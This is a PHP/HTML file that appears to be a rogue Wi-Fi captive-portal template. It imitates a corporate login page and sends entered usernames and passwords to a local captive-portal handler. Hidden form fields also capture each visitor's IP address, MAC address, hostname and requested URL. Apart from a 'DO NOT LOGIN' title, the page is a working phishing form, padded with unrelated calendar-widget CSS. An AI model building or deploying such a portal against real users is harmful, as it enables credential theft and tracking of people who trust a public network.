<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en">
  <script type="text/javascript">
          function redirect() {
            setTimeout(function() {
              window.location = "/captiveportal/index.php";
            }, 100);
          }
        </script>
  <head id="Head1"><title>
	  DO NOT LOGIN!!!!!!
</title>
    <script src="../js/jquery.min.js"></script>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon" /><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="apple-mobile-web-app-capable" content="yes" /><meta name="apple-touch-fullscreen" content="yes" /><link href="Public/global/css/main.css" rel="stylesheet" />
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
    <link href="assets/css/main.css" rel="stylesheet" />
    <script src="js/jquery.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/ie_prevention.js"></script>
    
    <style>
        .login_bg
        {
         background-color: #ffffff !important;
        }
    </style>
	
	<style>
        .Mercerfooter
        {
         //background-color: var(--dark) !important;
		 width: 100%;
		 height: 30px;
		 bottom: 0px;
		 left: 0px;
		 position: fixed;
		 color: #666;
		 text-align: right;
		 float:left;
        }
    </style>

    <style>
        body {
            margin: 0;
            font-family: open_sansregular;
        }
    </style>
    <link href='.../css/bootstrap.css' rel='stylesheet' />
    <link href='.../css/main.css' rel='stylesheet' />
  <style>
  .rdp {
    --rdp-cell-size: 40px;
    --rdp-accent-color: #0000ff;
    --rdp-background-color: #e7edff;
    --rdp-accent-color-dark: #3003e1;
    --rdp-background-color-dark: #180270;
    --rdp-outline: 2px solid var(--rdp-accent-color); /* Outline border for focused elements */
    --rdp-outline-selected: 2px solid rgba(0, 0, 0, 0.75); /* Outline border for focused _and_ selected elements */
  
    margin: 1em;
  }
  
  /* Hide elements for devices that are not screen readers */
  .rdp-vhidden {
    box-sizing: border-box;
    padding: 0;
    margin: 0;
    background: transparent;
    border: 0;
    -moz-appearance: none;
    -webkit-appearance: none;
    appearance: none;
    position: absolute !important;
    top: 0;
    width: 1px !important;
    height: 1px !important;
    padding: 0 !important;
    overflow: hidden !important;
    clip: rect(1px, 1px, 1px, 1px) !important;
    border: 0 !important;
  }
  
  /* Buttons */
  .rdp-button_reset {
    appearance: none;
    position: relative;
    margin: 0;
    padding: 0;
    cursor: default;
    color: inherit;
    outline: none;
    background: none;
    font: inherit;
  
    -moz-appearance: none;
    -webkit-appearance: none;
  }
  
  .rdp-button {
    border: 2px solid transparent;
  }
  
  .rdp-button[disabled] {
    opacity: 0.25;
  }
  
  .rdp-button:not([disabled]) {
    cursor: pointer;
  }
  
  .rdp-button:focus:not([disabled]),
  .rdp-button:active:not([disabled]) {
    color: inherit;
    border: var(--rdp-outline);
    background-color: var(--rdp-background-color);
  }
  
  .rdp-button:hover:not([disabled]) {
    background-color: var(--rdp-background-color);
  }
  
  .rdp-months {
    display: flex;
  }
  
  .rdp-month {
    margin: 0 1em;
  }
  
  .rdp-month:first-child {
    margin-left: 0;
  }
  
  .rdp-month:last-child {
    margin-right: 0;
  }
  
  .rdp-table {
    margin: 0;
    max-width: calc(var(--rdp-cell-size) * 7);
    border-collapse: collapse;
  }
  
  .rdp-with_weeknumber .rdp-table {
    max-width: calc(var(--rdp-cell-size) * 8);
    border-collapse: collapse;
  }
  
  .rdp-caption {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0;
    text-align: left;
  }
  
  .rdp-multiple_months .rdp-caption {
    position: relative;
    display: block;
    text-align: center;
  }
  
  .rdp-caption_dropdowns {
    position: relative;
    display: inline-flex;
  }
  
  .rdp-caption_label {
    position: relative;
    z-index: 1;
    display: inline-flex;
    align-items: center;
    margin: 0;
    padding: 0 0.25em;
    white-space: nowrap;
    color: currentColor;
    border: 0;
    border: 2px solid transparent;
    font-family: inherit;
    font-size: 140%;
    font-weight: bold;
  }
  
  .rdp-nav {
    white-space: nowrap;
  }
  
  .rdp-multiple_months .rdp-caption_start .rdp-nav {
    position: absolute;
    top: 50%;
    left: 0;
    transform: translateY(-50%);
  }
  
  .rdp-multiple_months .rdp-caption_end .rdp-nav {
    position: absolute;
    top: 50%;
    right: 0;
    transform: translateY(-50%);
  }
  
  .rdp-nav_button {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: var(--rdp-cell-size);
    height: var(--rdp-cell-size);
    padding: 0.25em;
    border-radius: 100%;
  }
  
  /* ---------- */
  /* Dropdowns  */
  /* ---------- */
  
  .rdp-dropdown_year,
  .rdp-dropdown_month {
    position: relative;
    display: inline-flex;
    align-items: center;
  }
  
  .rdp-dropdown {
    appearance: none;
    position: absolute;
    z-index: 2;
    top: 0;
    bottom: 0;
    left: 0;
    width: 100%;
    margin: 0;
    padding: 0;
    cursor: inherit;
    opacity: 0;
    border: none;
    background-color: transparent;
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
  }
  
  .rdp-dropdown[disabled] {
    opacity: unset;
    color: unset;
  }
  
  .rdp-dropdown:focus:not([disabled]) + .rdp-caption_label,
  .rdp-dropdown:active:not([disabled]) + .rdp-caption_label {
    border: var(--rdp-outline);
    border-radius: 6px;
    background-color: var(--rdp-background-color);
  }
  
  .rdp-dropdown_icon {
    margin: 0 0 0 5px;
  }
  
  .rdp-head {
    border: 0;
  }
  
  .rdp-head_row,
  .rdp-row {
    height: 100%;
  }
  
  .rdp-head_cell {
    vertical-align: middle;
    text-transform: uppercase;
    font-size: 0.75em;
    font-weight: 700;
    text-align: center;
    height: 100%;
    height: var(--rdp-cell-size);
    padding: 0;
  }
  
  .rdp-tbody {
    border: 0;
  }
  
  .rdp-tfoot {
    margin: 0.5em;
  }
  
  .rdp-cell {
    width: var(--rdp-cell-size);
    height: 100%;
    height: var(--rdp-cell-size);
    padding: 0;
    text-align: center;
  }
  
  .rdp-weeknumber {
    font-size: 0.75em;
  }
  
  .rdp-weeknumber,
  .rdp-day {
    display: flex;
    overflow: hidden;
    align-items: center;
    justify-content: center;
    box-sizing: border-box;
    width: var(--rdp-cell-size);
    max-width: var(--rdp-cell-size);
    height: var(--rdp-cell-size);
    margin: 0;
    border: 2px solid transparent;
    border-radius: 100%;
  }
  
  .rdp-day_today:not(.rdp-day_outside) {
    font-weight: bold;
  }
  
  .rdp-day_selected:not([disabled]),
  .rdp-day_selected:focus:not([disabled]),
  .rdp-day_selected:active:not([disabled]),
  .rdp-day_selected:hover:not([disabled]) {
    color: white;
    background-color: var(--rdp-accent-color);
  }
  
  .rdp-day_selected:focus:not([disabled]) {
    border: var(--rdp-outline-selected);
  }
  
  .rdp:not([dir='rtl']) .rdp-day_range_start:not(.rdp-day_range_end) {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0;
  }
  
  .rdp:not([dir='rtl']) .rdp-day_range_end:not(.rdp-day_range_start) {
    border-top-left-radius: 0;
    border-bottom-left-radius: 0;
  }
  
  .rdp[dir='rtl'] .rdp-day_range_start:not(.rdp-day_range_end) {
    border-top-left-radius: 0;
    border-bottom-left-radius: 0;
  }
  
  .rdp[dir='rtl'] .rdp-day_range_end:not(.rdp-day_range_start) {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0;
  }
  
  .rdp-day_range_end.rdp-day_range_start {
    border-radius: 100%;
  }
  
  .rdp-day_range_middle {
    border-radius: 0;
  }
  </style>
  </head>

<body class="login_bg">
    <div id="wrapper">
       <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='UserName-form-step'>

            <div class="content">
                <div class="container-fluid"> 
                    
    <div id="ContentPlaceholder_pnlLoginInfo">
	
        <div class="container-fluid">
		<nav class="navbar navbar-default">
                        <img src=".../assets/images/logo_black.png" id="imgLogo" alt="Logo Image" border="0">
            </nav>
            <div class="row">
                <div class="col-sm-9">
                    <div class="row headerBar">
                    </div>
                </div>
                <div class="col-sm-12 back_home">
                </div>
            </div>
            <div class="row">
                <div class="clearfix">

                    <div class="col-md-6 col-md-push-3 login_box">
                        <div class="">
                            <div class="panel-body">
                                <div class="">

                                    <div class="row">
                                        <div class="col-lg-12 zeropad has-error">
                                            <span id="ContentPlaceholder_Label4" class="control-label"></span>
                                        </div>
                                    </div>
                                </div>
                                 
                                <div id="ContentPlaceholder_pnlLogin">
		
                                    <div class="">
                                        <div class="panel panel-default panel-border">
                                            <div class="panel-body form-horizontal login_panel">
                                                <div class="row" style="display: none;">
                                                    <div class="bg-info msg_tab">
                                                        <i class="fa fa-sign-in" aria-hidden="true"></i>
                                                        <span id="ContentPlaceholder_lblPleaseLogin"></span>
                                                    </div>
                                                </div>
                                                <div class="form-group">
												<!--Adds the login graphic-->					
<img src="...assets/images/login_img1.jpg" width="500" alt="NO Image" class="img-responsive login_img" id="loginImg" title=" " />									
<!--End: Adds the login graphic-->
                                                    <span>
                                                        <span id="ContentPlaceholder_lblRequired" class="control-label">Required Field</span>
                                                    </span>
                                                    <sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
                                                    <div class="col-lg-12 zeropad has-error">

                                                        
                                                    </div>
                                                </div>
                                                <div class="form-group">
                                                    <p class="col-sm-4 alignment">
                                                        <label for="ContentPlaceholder_txtUserName" id="ContentPlaceholder_Label1" class="control-label"><u>U</u>sername</label>

                                                        <sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
                                                    </p>
                                                    <div class="col-sm-6">
                                                        <input name="ctl00$ContentPlaceholder$txtUserName" type="text" id="ContentPlaceholder_txtUserName" accesskey="u" class="form-control" />
                                                        
                                                    </div>
                                                </div>
                                                <div class="form-group">
                                                    <p class="col-sm-4 alignment">
                                                        <label for="ContentPlaceholder_txtPassword" id="ContentPlaceholder_Label2" class="control-label" style="font-weight:bold;"><u>P</u>assword</label>

                                                        <sup><i class="fa fa-star text-danger" aria-hidden="true"></i></sup>
                                                    </p>
                                                    <div class="col-sm-6">
                                                        <input name="ctl00$ContentPlaceholder$txtPassword" type="password" id="ContentPlaceholder_txtPassword" accesskey="p" class="form-control" />
                                                        
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="<?=$destination?>">
                                                        <div>
                                                            <span>Password is case sensitive</span>
                                                        </div>
                                                        
                                                    </div>
                                                </div>
                                                
                                                    <div class="col-sm-12 center">
                                                        <input type="submit" name="ctl00$ContentPlaceholder$Button1" value="Login" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ContentPlaceholder$Button1&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="ContentPlaceholder_Button1" class="btn btn-primary btn-sm" />
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                
	</div>
                                
                            </div>
                        </div>
                    </div>
                    
                </div>
            </div>
  
                </div>
            </div>

        
</form>
    </div>
</body>
</html>
<script type="text/javascript">


</script>
